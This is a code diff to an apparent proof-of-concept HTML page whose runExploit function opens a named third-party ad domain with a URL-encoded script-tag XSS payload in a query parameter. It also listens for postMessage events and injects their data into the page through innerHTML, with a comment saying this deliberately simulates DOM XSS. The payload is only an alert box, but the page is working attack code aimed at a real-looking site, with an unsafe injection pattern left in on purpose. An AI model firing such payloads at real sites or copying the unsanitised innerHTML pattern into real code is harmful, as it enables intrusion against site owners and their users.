@@ -10,20 +10,23 @@
 
     <script>
       function runExploit() {
-        // Open vulnerable site in new window
+        // Encode script tag to avoid breaking HTML
+        const payload = encodeURIComponent('<script>alert("XSS")</script>');
+
+        // Open the vulnerable site in a popup
         const win = window.open(
-          "https://ads.realizeperformance.com/?x=<script>alert('XSS')</script>",
+          `https://ads.realizeperformance.com/?x=${payload}`,
           "exploitWindow",
           "width=600,height=400"
         );
 
-        // Listen for postMessage
+        // Listen for the message from the child window
         window.addEventListener("message", function(event) {
           console.log("Received message:", event.data);
 
-          // Simulate vulnerable behavior (DOM injection)
           if (event.data && typeof event.data.value === "string") {
-            document.body.innerHTML += "<p>Injected: " + event.data.value + "</p>";
+            // Simulate vulnerable injection (DOM XSS)
+            document.body.innerHTML += `<p>Injected:</p><div>${event.data.value}</div>`;
           }
         }, false);
       }
